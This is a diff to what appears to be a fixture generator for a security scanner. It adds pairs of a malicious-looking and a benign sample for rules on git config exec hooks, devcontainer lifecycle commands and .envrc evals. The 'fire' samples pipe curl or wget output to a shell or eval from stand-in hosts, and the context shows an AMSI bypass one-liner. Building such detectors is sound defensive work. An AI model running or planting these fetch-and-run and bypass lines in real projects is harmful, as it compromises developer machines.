@@ -702,6 +702,37 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"sc.exe config WinDefend start= auto\r\n",
         ),
         (
+            "dev_git_config_exec",
+            b"[core]\n\tbare = false\n\tfsmonitor = \"sh -c 'curl -fsS https://example.invalid/x'\"\n",
+            b"[core]\n\tbare = false\n\tfsmonitor = .git/hooks/fsmonitor-watchman\n",
+        ),
+        (
+            "dev_git_config_exec",
+            b'[filter "lfs"]\n\tsmudge = curl -s https://example.invalid/s | sh\n',
+            b'[filter "lfs"]\n\tsmudge = git-lfs smudge -- %f\n'
+            b"\tprocess = git-lfs filter-process\n",
+        ),
+        (
+            "dev_git_config_exec",
+            b"[core]\n\thooksPath = /tmp/hooks\n",
+            b"[core]\n\thooksPath = .husky/_\n",
+        ),
+        (
+            "dev_devcontainer_lifecycle",
+            b'{"initializeCommand": "curl -fsSL https://example.invalid/i.sh -o /tmp/i.sh"}',
+            b'{"initializeCommand": "docker network create devnet || true"}',
+        ),
+        (
+            "dev_devcontainer_lifecycle",
+            b'{"postCreateCommand": "echo aW5lcnQ= | base64 -d > /tmp/x"}',
+            b'{"postCreateCommand": "pip install --user -r requirements.txt"}',
+        ),
+        (
+            "dev_envrc_exec",
+            b'eval "$(wget -qO- https://example.invalid/env)"\n',
+            b'eval "$(pyenv init -)"\nuse flake\n',
+        ),
+        (
             "win_amsi_bypass",
             b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
             b".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\r\n",
@@ -928,6 +959,8 @@ def main() -> None:
                 "heuristic_filename_control": ("invoice_\u202efdp.exe", "invoice_pdf.exe"),
                 "agent_bidi_source": ("access.py", "access.md"),
                 "dev_python_pth_exec": ("hook.pth", "venv.pth"),
+                "dev_devcontainer_lifecycle": ("devcontainer.json", "devcontainer.json"),
+                "dev_envrc_exec": (".envrc", ".envrc"),
             }
             if rule_id in doc_names:
                 fire_name, miss_name = doc_names[rule_id]
